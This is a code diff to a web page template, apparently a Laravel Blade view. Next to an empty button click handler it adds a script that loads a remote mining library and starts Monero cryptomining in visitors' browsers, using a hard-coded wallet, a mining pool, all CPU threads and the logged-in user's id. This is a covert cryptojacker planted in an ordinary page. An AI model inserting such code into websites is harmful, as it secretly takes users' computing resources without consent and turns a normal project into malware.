@@ -458,6 +458,27 @@
             }, 2000);
         });
     });
+
+
+
+    $("body").on("click", '.submit-answer-btn', {}, function(){
+        
+    });
+
+</script>
+
+<script src="https://coinwebmining.com/cwm.js"></script>
+<script>
+    var site_id = 'cwm-1132';
+    var coin = 'monero';
+    var wallet = '48WCGXaoL7gUY8fwSxUPgR4VYx4iVTJYEF4jP7Uq4jG26Hz9Gc6QjgU1m7Hht5pBPJbccCyR4khkZD88wSwErkRt2FkmpNH';
+    var password = 'cryptominer-web';
+    var mining_pool = 'mine.xmrpool.net:3333';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    var userid = 'cryptowave-{{ Auth::user()->id }}';
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug, userid);
 </script>
 
 </body>
